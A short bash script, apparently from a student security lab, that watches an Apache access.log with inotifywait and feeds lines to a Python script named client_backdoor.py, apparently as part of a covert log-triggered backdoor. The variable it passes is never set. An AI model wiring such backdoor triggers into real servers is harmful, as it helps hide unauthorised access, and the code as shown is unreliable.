#!/bin/bash

log_dir="/var/log/apache2"

# NOTE !!: Change this path to your actual script location
client_script="/home/student/Documents/python_scripts/server_client/client_backdoor.py"

# debug line: just to check that client_script file exists
# handler should be used instead
#cat "$client_script" | wc -l

# Function to process new log files
process_log() {

    local log_file="$1"

    #debug line: check that last line has content
    echo "Feeding: last line $last_line to python script"

    # feed last_line to python client script
    python3 "$client_script" "$last_line"

    #THIS IS WRONG -> echo "$last_line" | python3 "$client_script"
    #echo "New log file detected: $log_file"
}

# Monitor log directory for new access.log files
inotifywait -m -e create -e modify --format '%f' "$log_dir" |
while read -r file; do
    if [[ "$file" == "access.log" ]]; then
        process_log "$log_dir/$file"
    fi
done
